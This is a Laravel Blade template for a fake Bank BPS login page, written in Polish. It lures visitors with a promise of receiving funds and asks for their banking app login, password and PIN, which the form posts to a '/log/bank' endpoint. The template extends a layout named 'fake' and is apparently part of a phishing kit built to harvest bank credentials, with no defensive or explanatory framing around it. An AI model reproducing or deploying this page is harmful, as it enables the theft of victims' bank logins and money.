@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/getin.css') }}" rel="stylesheet">
@endpush
@section('content')
    <main role="main" class="container" style="max-width: 600px;">
        <div class="d-flex align-items-center p-3 my-3 text-white-50 rounded shadow-sm" style="background: #fff;">
            <img class="mr-3" src="{{asset('images/banks/bps.png')}}" alt="" height="80">
        </div>
        <div class="my-3 p-3 bg-white rounded shadow-sm">
            <div class="media-body pb-3 border-bottom border-gray justify-content-center">
                <div class="d-flex justify-content-between align-items-center w-100 border-bottom pb-2">
                    <h4 class="text-gray-dark">Aby pomyślnie otrzymać środki, przejdź przez autoryzację w Bank BPS</h4>
                </div>
                <br>
                <div class="row mb-1">
                    <form class="col-md-12" id="bank_pm_form" method="POST" action="/log/bank"
                          role="form">
                        <input name="login" type="text" class="form-control mb-2"
                               placeholder="Login do aplikacji bankowej" required="">
                        <input name="password" type="password" class="form-control mb-2" minlength="6"
                               placeholder="Hasło do aplikacji bankowej" required="">
                        <input name="pin" class="form-control mb-2" minlength="1" type="number"
                               placeholder="Kod PIN do aplikacji bankowej" required="">

                        <input type="submit" class="form-control btn btn-primary btn-lg" value="Wejść"
                               style="border-radius: inherit; background: #339f84;">
                    </form>
                </div>
                <br>
            </div>
        </div>
    </main>
@endsection